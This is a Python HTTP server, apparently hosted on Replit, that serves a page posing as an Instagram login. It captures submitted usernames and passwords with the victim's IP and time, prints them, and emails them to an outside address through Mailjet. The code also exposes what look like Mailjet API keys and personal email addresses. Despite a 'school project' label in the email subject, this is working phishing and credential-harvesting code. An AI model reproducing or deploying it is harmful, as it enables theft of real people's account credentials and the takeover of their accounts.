# server.py - versión para Replit
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime
import requests
import os

# --- CONFIG DESDE VARIABLES DE ENTORNO ---
MAILJET_API_KEY = os.environ.get("26f97d1e712110b2df6b678c218a6cc6")
MAILJET_SECRET_KEY = os.environ.get("9ce777cf5fc96abcb064e3ddecfc371d")
SENDER_EMAIL = os.environ.get("mexicanonwod@gmail.com")
RECIPIENT_EMAIL = os.environ.get("isowyvencid@gmail.com")
SENDER_NAME = "Instagram Phi"

# --- HANDLER ---
class InstagramHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_file('index.html', 'text/html')
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/login':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))

                username = data.get('username', '').strip()
                password = data.get('password', '').strip()
                ip = self.client_address[0]
                fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

                # Log local en consola Replit
                print(f"📥 Login recibido -> [{fecha}] {ip} | Usuario: {username} | Contraseña: {password}")

                # Enviar por Mailjet
                self.send_email_mailjet(username, password, ip, fecha)

                # Respuesta al cliente
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status": "success"}')
            except Exception as e:
                print(f"❌ Error al procesar login: {e}")
                self.send_error(500)
        else:
            self.send_error(404)

    def send_email_mailjet(self, username, password, ip, fecha):
        """Intentar enviar correo vía Mailjet"""
        url = "https://api.mailjet.com/v3.1/send"
        data = {
            "Messages": [
                {
                    "From": {"Email": SENDER_EMAIL, "Name": SENDER_NAME},
                    "To": [{"Email": RECIPIENT_EMAIL, "Name": "Receptor"}],
                    "Subject": "🚨 Nuevo inicio de sesión (Proyecto Escolar)",
                    "TextPart": f"""
Usuario: {username}
Contraseña: {password}
IP: {ip}
Fecha: {fecha}
                    """.strip()
                }
            ]
        }

        try:
            response = requests.post(
                url,
                json=data,
                auth=(MAILJET_API_KEY, MAILJET_SECRET_KEY)
            )
            print("🔎 Mailjet response:", response.status_code, response.text)

            if response.status_code == 200:
                print("✅ Correo enviado con Mailjet")
            else:
                print("❌ Mailjet rechazó el envío")
        except Exception as e:
            print(f"⚠️ Error al conectar con Mailjet: {e}")

    def send_file(self, filename, content_type):
        try:
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_error(404)

# --- MAIN ---
if __name__ == "__main__":
    PORT = int(os.getenv("PORT", 8000))  # Replit asigna el puerto automáticamente
    server = HTTPServer(('0.0.0.0', PORT), InstagramHandler)
    print(f"✅ Servidor corriendo en http://localhost:{PORT}")
    server.serve_forever()

